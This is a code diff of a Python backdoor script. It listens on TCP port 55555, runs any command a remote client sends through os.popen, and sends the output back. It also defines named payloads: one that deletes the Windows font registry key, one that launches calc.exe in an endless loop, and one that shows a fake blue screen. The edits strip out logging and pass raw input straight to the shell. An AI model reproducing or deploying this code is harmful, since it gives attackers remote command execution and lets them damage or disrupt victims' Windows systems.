@@ -1,39 +1,34 @@
 __author__ = 'RetR0'
-
 import os
 import threading
 import socket
-
 host = (socket.gethostbyname(socket.gethostname()))
 port = int('55555')
 client_list = []
-
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server.bind((host, port))
 server.listen()
 client, address = server.accept()
-print(address)
-
 def reciv():
     while True:
         try:
             it = client.recv(3072)
             it = it.decode('utf-8')
+            if it == "QUIT":
+                client.close()
+                server.close()
             if it == "FUCKFONTS":
                 commandum = ('cmd /c "REG DELETE "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Fonts" /va /f"')
-                result = ("\nx#FUCKFONTS ACTIVATED#x")
-                print ("######")
+                result = ("\nx#FUCKFONTS ACTIVATED#x\n")
                 result = result.encode()
                 client.send(result)
             if it == "CALCCALCCALC":
                 commandum = ('powershell /c "while ($true) {start calc.exe}"')
-                result = ("\nx#CALCCALCCALC ACTIVATED#x")
-                print ("######")
+                result = ("\nx#CALCCALCCALC ACTIVATED#x\n")
                 result = result.encode()
                 client.send(result)
             if it == "FAKEBSOD":
-                result = ("\nx#FAKEBSOD ACTIVATED#x")
-                print ("######")
+                result = ("\nx#FAKEBSOD ACTIVATED#x\n")
                 result = result.encode()
                 client.send(result)
                 os.system('cmd /c "@echo off "')
@@ -77,14 +72,10 @@ def reciv():
                 os.system('cmd /c "start "" /wait "bsod.hta" "')
                 os.system('cmd /c "del /s /f /q "bsod.hta" > nul "')
             else:    
-                commandum = (f'powershell /c {it}')
+                commandum = it
                 result = os.popen(commandum).read()
-                print ("######")
                 result = result.encode()
                 client.send(result)
         except:
             client.close()
-            print ("An error occured!!!")
-            quit()
-
 reciv()
